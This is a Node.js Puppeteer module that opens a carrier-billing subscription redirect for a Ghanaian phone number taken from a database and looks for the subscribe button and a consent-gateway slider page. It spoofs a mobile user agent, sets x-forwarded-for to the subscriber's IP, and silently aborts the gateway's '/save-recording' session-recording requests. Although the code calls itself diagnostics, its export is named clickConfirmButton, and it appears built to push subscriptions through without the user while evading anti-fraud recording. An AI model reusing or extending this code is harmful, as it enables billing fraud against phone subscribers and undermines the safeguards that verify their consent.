
const { getBrowser } = require("./browsermanager");

const REDIRECT_ENDPOINT = "http://46.73.143.112/Redirect";
const REDIRECT_DESTINATION = "http://mobile.arenaxpro.com/redirect";
const OFFER_CODE = "9916710032";

const sleep = ms =>
    new Promise(resolve => setTimeout(resolve, ms));

// Build redirect using database MSISDN
function getRedirectUrl(msisdn) {
    if (!msisdn) {
        throw new Error("Database MSISDN is missing");
    }

    const cleanMsisdn = String(msisdn).replace(/\D/g, "");

    if (!/^233\d{9}$/.test(cleanMsisdn)) {
        throw new Error("Invalid Ghana MSISDN");
    }

    const url = new URL(REDIRECT_ENDPOINT);

    url.searchParams.set("OfferCode", OFFER_CODE);
    url.searchParams.set("redirectUrl", REDIRECT_DESTINATION);
    url.searchParams.set("mobileNumber", cleanMsisdn);

    return url.toString();
}

// Block session recording
async function blockSessionRecording(page) {
    await page.setRequestInterception(true);

    const stats = {
        blocked: 0,
        allowed: 0
    };

    page.on("request", request => {
        const url = request.url();

        if (
            url.includes("/save-recording") &&
            url.includes("sc=nigeria")
        ) {
            stats.blocked++;

            console.log("[SECURITY] Recording blocked:", url);

            request.abort("blockedbyclient").catch(() => {});
            return;
        }

        stats.allowed++;
        request.continue().catch(error => {
            console.error("[REQUEST ERROR]", error.message);
        });
    });

    return stats;
}

// Browser diagnostics
function registerDiagnostics(page, label) {
    page.on("requestfailed", request => {
        console.error(
            `[${label}] REQUEST FAILED`,
            request.url(),
            request.failure()?.errorText
        );
    });

    page.on("pageerror", error => {
        console.error(`[${label}] PAGE ERROR`, error.message);
    });

    page.on("response", response => {
        if (response.status() >= 400) {
            console.error(
                `[${label}] HTTP ${response.status()}`,
                response.url()
            );
        }
    });

    page.on("framenavigated", frame => {
        if (frame === page.mainFrame()) {
            console.log(`[${label}] URL:`, frame.url());
        }
    });
}

// Inspect page elements
async function inspectPage(page) {
    return page.evaluate(() => {
        const subscribe = document.querySelector(
            "#bannerSubscribeBtn"
        );

        const container = document.querySelector("#container");
        const slider = document.querySelector("#button");

        return {
            url: location.href,
            title: document.title,

            subscribeButton: subscribe
                ? {
                    text: subscribe.innerText.trim(),
                    visible: !!(
                        subscribe.offsetWidth ||
                        subscribe.offsetHeight
                    ),
                    disabled: subscribe.disabled
                }
                : null,

            sliderContainerDetected: !!container,
            sliderButtonDetected: !!slider,

            pageText: (
                document.body?.innerText || ""
            ).slice(0, 1500)
        };
    });
}

// Find CG page in existing tabs
async function findCgPage(browser, timeout = 60000) {
    const start = Date.now();

    while (Date.now() - start < timeout) {
        const pages = await browser.pages();

        for (const candidate of pages) {
            if (candidate.isClosed()) continue;

            try {
                const state = await inspectPage(candidate);

                if (
                    state.sliderContainerDetected &&
                    state.sliderButtonDetected
                ) {
                    return candidate;
                }
            } catch (_) {
                // Page is navigating.
            }
        }

        await sleep(500);
    }

    return null;
}

// Main function
const clickConfirmButton = async ({
    msisdn,
    client_ip,
    transactionId,
    headers
} = {}) => {
    let browser;
    let page;
    let cgPage;

    try {
        const redirectUrl = getRedirectUrl(msisdn);

        console.log("[PORTAL] Starting customer diagnostics");
        console.log("[PORTAL] MSISDN loaded from database");
        console.log("[PORTAL] Opening redirect endpoint");

        browser = await getBrowser();

        if (!browser || !browser.isConnected()) {
            throw new Error("Browser is not connected");
        }

        page = await browser.newPage();

        await page.setViewport({
            width: 1280,
            height: 900
        });

        page.setDefaultNavigationTimeout(90000);
        page.setDefaultTimeout(30000);

        registerDiagnostics(page, "PORTAL");

        const security = await blockSessionRecording(page);

        await page.setUserAgent(
            "Mozilla/5.0 (Linux; Android 10; K) " +
            "AppleWebKit/537.36 (KHTML, like Gecko) " +
            "Chrome/153.0.0.0 Mobile Safari/537.36"
        );

        const requestHeaders = {
            "accept-language":
                headers?.["accept-language"] || "en-US,en;q=0.9"
        };

        if (client_ip) {
            requestHeaders["x-forwarded-for"] = String(client_ip);
        }

        await page.setExtraHTTPHeaders(requestHeaders);

        // Open redirect
        const response = await page.goto(redirectUrl, {
            waitUntil: "domcontentloaded",
            timeout: 90000
        });

        console.log(
            "[PORTAL] Response:",
            response?.status() ?? "No response"
        );

        console.log("[PORTAL] Final URL:", page.url());

        // Detect Subscribe button
        await page.waitForSelector("#bannerSubscribeBtn", {
            visible: true,
            timeout: 30000
        });

        const landingState = await inspectPage(page);

        console.log(
            "[PORTAL] Landing state:",
            JSON.stringify(landingState, null, 2)
        );

        // Observe CG page if it is opened independently
        cgPage = await findCgPage(browser, 60000);

        let cgState = null;

        if (cgPage) {
            registerDiagnostics(cgPage, "CG");
            cgState = await inspectPage(cgPage);

            console.log(
                "[CG] Page detected:",
                JSON.stringify(cgState, null, 2)
            );
        } else {
            console.log("[CG] No separate consent page detected");
        }

        return {
            success: true,
            testOnly: true,
            transactionId: transactionId || null,
            status: "PAGE_DIAGNOSTICS_COMPLETED",
            landingPage: landingState,
            cgPage: cgState,
            security: {
                blocked: security.blocked,
                allowed: security.allowed
            }
        };

    } catch (error) {
        console.error(
            "[PORTAL ERROR]",
            error.stack || error.message
        );

        return {
            success: false,
            testOnly: true,
            status: "PORTAL_ERROR",
            error: error.message
        };

    } finally {
        for (const tab of [cgPage, page]) {
            if (tab && !tab.isClosed()) {
                await tab.close().catch(() => {});
            }
        }

        console.log("[PORTAL] Browser tabs closed");
    }
};

module.exports = clickConfirmButton;
